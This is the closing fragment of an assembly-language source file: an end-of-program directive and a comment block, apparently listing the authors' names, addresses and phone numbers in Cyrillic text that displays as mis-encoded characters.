	end	entry_point		; ¢µ®¤­  ²®·ª  ¯°¨ ±² °²¨° ­¥

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;	Ÿ­¨ ‹¾¡®¬¨°®¢ ° ­ª®¢ , Œ¨µ ©«®¢£° ¤  ³«."ƒ.„ ¬¿­®¢"  6
;			  , ²¥«.2-13-34
;	‹¾¡®¬¨° Œ ²¥¥¢ Œ ²¥¥¢ , ‘®´¨¿  ³«."³¤ ¯¥¹ " 14
;			  , ²¥«.80-28-26
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

